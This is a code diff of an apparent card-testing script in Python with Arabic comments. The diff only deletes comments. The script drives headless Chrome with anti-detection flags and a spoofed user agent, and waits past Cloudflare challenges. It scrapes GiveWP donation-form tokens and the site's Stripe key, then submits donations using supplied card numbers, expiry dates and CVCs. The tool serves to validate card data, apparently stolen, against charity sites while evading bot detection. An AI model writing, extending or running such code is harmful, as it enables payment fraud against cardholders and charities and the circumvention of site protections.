@@ -16,13 +16,12 @@ from selenium.webdriver.support import expected_conditions as EC
 
 
 def setup_selenium_driver(headless=True):
-    """إعداد Selenium Chrome - الطريقة اللي كانت شغالة"""
+    """إعداد Selenium Chrome"""
     options = Options()
     
     if headless:
         options.add_argument('--headless=new')
     
-    # ═══ Performance ═══
     options.add_argument('--no-sandbox')
     options.add_argument('--disable-dev-shm-usage')
     options.add_argument('--disable-gpu')
@@ -31,21 +30,17 @@ def setup_selenium_driver(headless=True):
     options.add_argument('--window-size=1920,1080')
     options.add_argument('--log-level=3')
     
-    # ═══ Anti-detection ═══
     options.add_argument('--disable-blink-features=AutomationControlled')
     options.add_argument('--disable-features=IsolateOrigins,site-per-process')
     options.add_experimental_option("excludeSwitches", ["enable-automation"])
     options.add_experimental_option('useAutomationExtension', False)
     
-    # ═══ User-Agent حقيقي ═══
     options.add_argument(
         'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
     )
     
-    # ═══ Page Load Strategy ═══
     options.page_load_strategy = 'eager'
     
-    # ═══ Cookies + Profile ═══
     prefs = {
         "profile.managed_default_content_settings.images": 2,
         "profile.default_content_setting_values.notifications": 2,
@@ -55,10 +50,8 @@ def setup_selenium_driver(headless=True):
     }
     options.add_experimental_option("prefs", prefs)
     
-    # ═══ Driver ═══
     driver = None
     
-    # محاولة 1: System ChromeDriver
     try:
         if os.path.exists('/usr/bin/chromedriver'):
             print("✅ Using system chromedriver")
@@ -70,7 +63,6 @@ def setup_selenium_driver(headless=True):
     except Exception as e:
         print(f"⚠️ System driver failed: {e}")
     
-    # محاولة 2: webdriver-manager
     if driver is None:
         try:
             from webdriver_manager.chrome import ChromeDriverManager
@@ -80,12 +72,10 @@ def setup_selenium_driver(headless=True):
         except Exception as e:
             print(f"⚠️ webdriver-manager failed: {e}")
     
-    # محاولة 3: Default
     if driver is None:
         driver = webdriver.Chrome(options=options)
         print("✅ Using default Chrome")
     
-    # ═══ Anti-Detection Scripts ═══
     driver.execute_cdp_cmd('Network.setUserAgentOverride', {
         "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
     })
@@ -108,16 +98,13 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
     
     driver = None
     try:
-        # ═══ Setup Driver ═══
         print("🚀 Launching Chrome...")
         driver = setup_selenium_driver(headless=True)
         print("✅ Chrome launched")
         
-        # ═══ Open Page ═══
         print(f"🌐 Opening: {url}")
         driver.get(url)
         
-        # ═══ Smart Wait for Cloudflare ═══
         print("⏳ Waiting for page + Cloudflare...")
         
         max_wait = 30
@@ -129,18 +116,15 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
                 html = driver.page_source
                 html_lower = html.lower()
                 
-                # Check for Cloudflare Challenge
                 if 'just a moment' in html_lower or 'checking your browser' in html_lower:
                     print("   ⚠️ Cloudflare challenge detected, waiting...")
                     time.sleep(3)
                     continue
                 
-                # Check for GiveWP form
                 if 'give-form-id' in html or 'givewp' in html_lower:
                     page_ready = True
                     break
                 
-                # Check page length
                 if len(html) > 5000:
                     page_ready = True
                     break
@@ -149,7 +133,6 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
             except:
                 time.sleep(1)
         
-        # ═══ Final Check ═══
         current_url = driver.current_url
         title = driver.title
         html = driver.page_source
@@ -158,7 +141,6 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
         print(f"📍 Title: {title}")
         print(f"📄 Source length: {len(html)}")
         
-        # ═══ Wait for Cloudflare more if needed ═══
         html_lower = html.lower()
         if 'just a moment' in html_lower or 'checking your browser' in html_lower:
             print("⚠️ Cloudflare still active, waiting 20s more...")
@@ -168,13 +150,11 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
             if 'just a moment' in html_lower:
                 return "CLOUDFLARE_CHALLENGE"
         
-        # ═══ Extract Form Data ═══
         form_id = None
         form_hash = None
         form_prefix = None
         stripe_key = None
         
-        # طريقة 1: find_elements
         try:
             els = driver.find_elements(By.NAME, "give-form-id")
             if els:
@@ -196,7 +176,6 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
         except:
             pass
         
-        # طريقة 2: من HTML
         if not form_id:
             m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
             if m:
@@ -212,7 +191,6 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
             if m:
                 form_prefix = m.group(1)
         
-        # Stripe Key
         m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
         if m:
             stripe_key = m.group(0)
@@ -225,7 +203,6 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
         if not form_id or not form_hash:
             return f"MISSING_FORM_DATA (len={len(html)})"
         
-        # ═══ Generate Stripe PM ═══
         print("💳 Generating Stripe Payment Method...")
         
         stripe_js = """
@@ -323,11 +300,9 @@ def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
             pm_id = pm_data.get('pm_id')
             print(f"✅ PM ID: {pm_id}")
             
-            # ═══ Get Cookies ═══
             cookies = driver.get_cookies()
             print(f"✅ Got {len(cookies)} cookies")
             
-            # ═══ POST Donation ═══
             print("💸 Submitting donation...")
             
             session = requests.Session()
